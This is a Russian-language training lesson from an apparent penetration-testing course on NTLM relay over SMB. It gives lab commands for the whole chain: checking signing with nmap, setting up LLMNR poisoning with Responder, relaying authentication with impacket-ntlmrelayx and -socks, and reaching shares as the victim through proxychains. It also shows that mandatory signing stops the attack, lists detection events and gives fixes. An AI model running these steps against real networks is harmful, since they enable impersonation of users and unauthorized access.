# 7.3 — SMB relay и перехват NTLM

> **M07 · Этап 1 · 4 ч · 🔴 · артефакт:** `labs/m07-network-attacks/l03-relay/`

## Цель

Понять, как перехваченная NTLM-аутентификация переигрывается на другой сервер, и почему SMB signing — главный рубильник этой атаки.

## Результат

- Проверяете SMB signing на цели.
- Настраиваете Responder + ntlmrelayx.
- Релеите аутентификацию на хост без обязательной подписи.
- Знаете, как это ломается одной настройкой.

## Теория

- NTLM relay = attacker принимает challenge/response от жертвы и переигрывает его к другому серверу.
- Атака возможна, когда сервер не требует SMB signing (или LDAP signing/channel binding).
- Responder используется только для poisoning (LLMNR); SMB/HTTP в нём отключаются, чтобы порт 445 занял ntlmrelayx.
- `ntlmrelayx` может выполнить команду, выгрузить SAM/LAPS, создать пользователя или открыть SOCKS.
- Релей к DC по SMB обычно блокируется (DC требует signing), но LDAP/ADCS — отдельная история (M11).
- Релей не даёт пароль, но даёт доступ от имени жертвы.

## Лаборатория

### 1. Проверить подпись

```bash
nmap --script smb2-security-mode -p 445 10.10.10.20
nmap --script smb2-security-mode -p 445 10.10.10.10
```

Ожидаемо:

```
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

Для DC чаще `required`. Запишите, кто уязвим.

### 2. Подготовить Responder

```bash
sudo cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak
sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
grep -E '^(SMB|HTTP)' /etc/responder/Responder.conf
```

Ожидаемо: `SMB = Off`, `HTTP = Off`.

### 3. Запустить relay

Цель — Samba на LNX01 с отключённой подписью (или второй Windows без signing):

```bash
# на LNX01
sudo pacman -S samba
sudo mkdir -p /srv/share && sudo chmod 777 /srv/share
sudo tee /etc/samba/smb.conf >/dev/null <<'EOF'
[global]
   workgroup = LAB
   server signing = no
   map to guest = Bad User
   security = user
[share]
   path = /srv/share
   writable = yes
EOF
sudo systemctl enable --now smb
```

На attacker:

```bash
echo '10.10.10.30' > relay/targets.txt
sudo responder -I eth0 -rdw &
sudo impacket-ntlmrelayx -tf relay/targets.txt -smb2support -socks
```

Ожидаемо: ntlmrelayx слушает 445 и ждёт.

### 4. Спровоцировать

На WS01:

```powershell
dir \\fileserver01\share
```

Ожидаемо: Responder отравляет LLMNR, ntlmrelayx получает аутентификацию и релеит на `10.10.10.30`:

```
[*] Authenticating against smb://10.10.10.30 as LAB/alice SUCCEED
```

### 5. Проверить доступ

В консоли ntlmrelayx:

```
ntlmrelayx> socks
```

Используйте прокси:

```bash
proxychains4 smbclient -L //10.10.10.30 -N
```

Ожидаемо: список шар, доступ от имени alice. Если alice — локальный админ цели, можно `-c whoami` или выгрузить SAM.

### 6. Убедиться, что подпись ломает атаку

Включите на Samba `server signing = mandatory`, перезапустите, повторите.

Ожидаемо: `Authenticating against smb://... FAILED` — relay не работает.

## Атака и защита

- **Атака:** relay → доступ, выполнение команд, выгрузка секретов; особо опасен для админов.
- **Детект:** 4624 type 3 с NTLM, 4776, аномальные входы с неожиданного IP, SMB-сессии.
- **Фикс:** SMB signing required, LDAP signing + channel binding, отключить NTLM, tiering, запрет админам логиниться на рабочие станции.

## Самопроверка

- [ ] Почему relay не требует пароля?
- [ ] Почему DC сложнее релеить по SMB?
- [ ] Что делает `-socks` и зачем он нужен?
- [ ] Какая одна настройка ломает атаку?

## Дальше

[7.4 — L2-атаки](l04-l2-attacks.md)
